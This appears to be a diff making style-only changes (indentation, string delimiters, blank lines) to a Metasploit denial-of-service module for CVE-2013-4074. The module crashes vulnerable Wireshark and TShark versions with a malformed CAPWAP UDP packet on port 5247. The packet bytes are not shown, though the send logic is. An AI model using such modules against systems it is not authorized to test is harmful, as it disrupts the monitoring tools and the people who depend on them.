@@ -1,3 +1,4 @@
+# frozen_string_literal: true
 #
 # This module requires Metasploit: http://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
@@ -6,38 +7,36 @@
 require 'msf/core'
 
 class MetasploitModule < Msf::Auxiliary
-
   include Msf::Exploit::Remote::Udp
   include Msf::Auxiliary::Dos
 
   def initialize(info = {})
     super(update_info(info,
-      'Name'           => 'Wireshark CAPWAP Dissector DoS',
-      'Description'    => %q{
-        This module injects a malformed UDP packet to crash Wireshark and TShark 1.8.0 to 1.8.7, as well
-        as 1.6.0 to 1.6.15. The vulnerability exists in the CAPWAP dissector which fails to handle a
-        packet correctly when an incorrect length is given.
-      },
-      'License'        => MSF_LICENSE,
-      'Author'         =>
-        [
-          'Laurent Butti', # Discovery vulnerability
-          'j0sm1'  # Auxiliary msf module
-        ],
-      'References'     =>
-        [
-          ['CVE', '2013-4074'],
-          ['OSVDB', '94091'],
-          ['BID', '60500']
-        ],
-      'DisclosureDate' => 'Apr 28 2014'))
+                      'Name'           => 'Wireshark CAPWAP Dissector DoS',
+                      'Description'    => %q(
+                        This module injects a malformed UDP packet to crash Wireshark and TShark 1.8.0 to 1.8.7, as well
+                        as 1.6.0 to 1.6.15. The vulnerability exists in the CAPWAP dissector which fails to handle a
+                        packet correctly when an incorrect length is given.
+                      ),
+                      'License'        => MSF_LICENSE,
+                      'Author'         =>
+                        [
+                          'Laurent Butti', # Discovery vulnerability
+                          'j0sm1' # Auxiliary msf module
+                        ],
+                      'References'     =>
+                        [
+                          ['CVE', '2013-4074'],
+                          ['OSVDB', '94091'],
+                          ['BID', '60500']
+                        ],
+                      'DisclosureDate' => 'Apr 28 2014'))
 
     # Protocol capwap needs port 5247 to trigger the dissector in wireshark
     register_options([ Opt::RPORT(5247) ], self.class)
   end
 
   def run
-
     connect_udp
 
     # We send a packet incomplete to crash dissector
@@ -50,6 +49,5 @@ class MetasploitModule < Msf::Auxiliary
     udp_sock.put(buf)
 
     disconnect_udp
-
   end
 end
